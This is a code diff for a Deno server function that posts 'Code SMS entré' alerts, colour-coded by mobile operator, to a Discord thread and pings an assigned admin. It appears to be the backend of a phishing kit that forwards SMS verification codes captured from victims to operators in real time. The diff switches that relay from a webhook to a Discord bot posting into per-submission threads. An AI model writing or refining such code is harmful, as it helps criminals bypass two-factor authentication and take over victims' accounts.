@@ -1,6 +1,6 @@
 import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';
 
-const DISCORD_WEBHOOK = Deno.env.get("DISCORD_WEBHOOK");
+const DISCORD_BOT_TOKEN = Deno.env.get("DISCORD_BOT_TOKEN");
 
 Deno.serve(async (req) => {
   const base44 = createClientFromRequest(req);
@@ -68,6 +68,10 @@ Deno.serve(async (req) => {
     }
   }
 
+  // Get submission with thread_id
+  const sub = await base44.asServiceRole.entities.Submission.get(submissionId).catch(() => null);
+  const threadId = sub?.discord_thread_id;
+
   const embed = {
     title: "🔑 Code SMS entré",
     color: operatorColors[operateur] || 16776960,
@@ -92,11 +96,27 @@ Deno.serve(async (req) => {
     timestamp: now.toISOString(),
   };
 
-  await fetch(DISCORD_WEBHOOK, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ content: "@everyone", embeds: [embed] }),
-  });
+  // If thread exists, post in thread; otherwise, post to webhook
+  if (threadId && sub?.discord_admin_id) {
+    const postRes = await fetch(
+      `https://discord.com/api/v10/channels/${threadId}/messages`,
+      {
+        method: "POST",
+        headers: {
+          "Authorization": `Bot ${DISCORD_BOT_TOKEN}`,
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: `<@${sub.discord_admin_id}> Code entré!`,
+          embeds: [embed]
+        })
+      }
+    ).catch(() => null);
+    
+    if (!postRes?.ok) {
+      console.error("Thread message post failed");
+    }
+  }
 
   return Response.json({ ok: true });
 });
